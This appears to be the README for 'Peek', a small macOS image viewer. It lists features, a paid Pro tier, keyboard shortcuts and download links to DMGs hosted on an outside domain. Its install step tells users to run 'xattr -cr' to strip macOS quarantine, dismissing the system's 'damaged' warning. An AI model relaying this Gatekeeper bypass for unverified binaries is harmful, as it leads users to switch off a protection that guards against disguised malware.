<p align="center">
  <img src="https://ipconfig.co.network/updates/peek/icon.png" width="128" height="128" alt="Peek">
</p>

<h1 align="center">Peek</h1>

<p align="center">A fast, minimal image viewer for macOS.<br>
Open a picture, arrow through the folder, get back to work.</p>

<p align="center"><b>Version 2.0.4</b> · about 4–5 MB · macOS 10.15 or later</p>

---

## Download

| Mac | Download |
|---|---|
| **Apple Silicon** (M1 and later) | [Peek_2.0.4_aarch64.dmg](https://ipconfig.co.network/updates/peek/Peek_2.0.4_aarch64.dmg) |
| **Intel** | [Peek_2.0.4_x64.dmg](https://ipconfig.co.network/updates/peek/Peek_2.0.4_x64.dmg) |

Not sure which? Apple menu → **About This Mac**. "Apple M1/M2/M3/M4" means Apple Silicon; "Intel" means Intel.
All versions are on the [Releases](../../releases) page.

## Install

1. Open the DMG and drag **Peek** into **Applications**.
2. Open **Terminal** and run this once:

   ```bash
   xattr -cr /Applications/Peek.app
   ```

3. Open Peek.

**Why step 2?** Peek is not distributed through the App Store, so macOS marks a downloaded copy as quarantined and may
say it is "damaged". That command removes the download flag — it changes nothing else. You only need it for a copy
downloaded in a browser; updates installed from inside Peek don't need it.

## Updating

Peek updates itself: **Update → Check for Updates**, then **Install & Restart**.

**Coming from Peek 1.x?** Download and install the DMG above once, by hand. Version 1 cannot install updates by
itself — its update button downloads the new version and then fails to install it. After this one manual install,
every later update is automatic.

## What it does

- Opens **JPEG, PNG, GIF, WebP, HEIC/HEIF, TIFF, BMP, SVG and ICO** — and AVIF on macOS 13 or later
- Arrow keys walk the folder, in the order you'd expect (`img2` before `img10`)
- Zoom, pan, rotate, flip, fit-to-window and actual size
- One window per image, opened straight from Finder
- Copy, Share / AirDrop, Reveal in Finder, Move to Trash
- Info panel: dimensions, size, dates
- Large photos open as a sharp preview instead of slowing the Mac down
- Light and dark appearance

### Peek Pro

Slideshow, colour picker (click to copy the hex), batch rename, batch convert, crop & resize, and watermark.
**₹20/month** or **₹220/year**, paid through Razorpay inside the app. Activation codes work too:
**Peek → Enter Activation Code**.

## Keyboard

| | |
|---|---|
| Open image / folder | ⌘O / ⇧⌘O |
| Previous / next | ← / → |
| Zoom in / out | ⌘= / ⌘− |
| Fit / actual size | ⌘0 / ⌘1 |
| Rotate right / left | ⌘R / ⇧⌘L |
| Fullscreen | F |
| Info panel / sidebar | I / ⌘B |
| Copy · Share · Trash | ⌘C · ⇧⌘A · ⌘⌫ |

## Privacy

Your images never leave your Mac. Peek connects to the internet for three things only: checking for updates,
activating a code, and a subscription checkout you start yourself.

## Support Peek

Peek is made by one person. If it saves you time, you can
[buy me a coffee](https://razorpay.me/@NSBJKS) — any amount, one tap, UPI or card.

## Problems

[Open an issue](../../issues) with your macOS version, your Mac (Apple Silicon or Intel), and what happened.

---

Made by **Jagadeesh Kumar S** — [NewsCraft Studio on YouTube](https://www.youtube.com/@JKS-sys) ·
[JKS.sys@icloud.com](mailto:JKS.sys@icloud.com) · [Sponsor](https://razorpay.me/@NSBJKS)
